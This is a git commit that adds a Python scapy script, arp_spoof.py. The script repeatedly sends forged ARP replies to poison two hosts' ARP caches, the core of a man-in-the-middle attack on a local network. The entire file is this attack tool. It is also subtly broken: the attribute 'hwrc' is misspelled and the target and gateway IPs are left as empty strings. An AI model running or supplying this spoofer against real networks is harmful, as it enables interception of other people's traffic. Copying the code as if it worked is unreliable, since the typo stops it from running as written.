e631fb2df439c0d52e984c53faaf9a91603e2246
RR218 <raimi.ramlee@gmail.com>
2021-05-05 21:42:49 +0800

    first commit

---
+++ arp_spoof.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python3
+
+import scapy.all as scapy
+import time
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof("", "")
+        spoof("", "")
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ....... Quitting.")
